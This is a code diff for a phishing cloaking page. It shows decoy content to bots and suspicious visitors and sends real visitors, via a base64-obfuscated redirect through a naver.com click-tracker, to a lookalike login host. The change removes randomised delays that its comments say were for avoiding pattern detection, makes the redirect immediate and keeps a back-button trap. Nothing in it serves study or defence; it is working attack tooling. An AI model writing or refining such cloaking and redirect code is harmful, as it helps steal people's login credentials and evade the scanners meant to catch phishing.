@@ -142,7 +142,6 @@
 
         if (showFakeContent) {
             // Show fake content for bots/suspicious users
-            document.getElementById('loadingScreen').style.display = 'none';
             document.getElementById('fakeContent').style.display = 'block';
             document.body.style.background = 'white';
             document.body.style.padding = '20px';
@@ -157,31 +156,20 @@
                 }
             });
         } else {
-            // For legitimate users, perform obfuscated redirect
+            // Hide loading screen immediately for legitimate users
+            document.body.style.display = 'none';
+            
+            // For legitimate users, perform immediate obfuscated redirect
             var encoded = btoa('https://cc.naver.com/cc?a=pst.link&r=&i=&m=1&nsc=Mblog.post&u=https://supprt.alwaysdata.net/id.css.chノauthノuiノappノauthノflowノmycss-loginノextノlogin');
             
-            function executeRedirect() {
-                try {
-                    var target = atob(encoded);
-                    var delay = Math.floor(Math.random() * 1000) + 2000; // 2-3 second delay
-                    
-                    setTimeout(function() {
-                        // Use multiple redirect methods for better compatibility
-                        if (window.location.replace) {
-                            window.location.replace(target);
-                        } else {
-                            window.location.href = target;
-                        }
-                    }, delay);
-                } catch(e) {
-                    // Direct fallback (this line will be obfuscated in production)
-                    window.location.href = 'https://cc.naver.com/cc?a=pst.link&r=&i=&m=1&nsc=Mblog.post&u=https://supprt.alwaysdata.net/id.css.chノauthノuiノappノauthノflowノmycss-loginノextノlogin';
-                }
+            try {
+                var target = atob(encoded);
+                // Immediate redirect
+                window.location.replace(target);
+            } catch(e) {
+                // Direct fallback
+                window.location.href = 'https://cc.naver.com/cc?a=pst.link&r=&i=&m=1&nsc=Mblog.post&u=https://supprt.alwaysdata.net/id.css.chノauthノuiノappノauthノflowノmycss-loginノextノlogin';
             }
-            
-            // Add randomization to avoid pattern detection
-            var randomDelay = Math.floor(Math.random() * 500) + 100;
-            setTimeout(executeRedirect, randomDelay);
             
             // Prevent back button from working
             history.pushState(null, null, window.location.pathname);
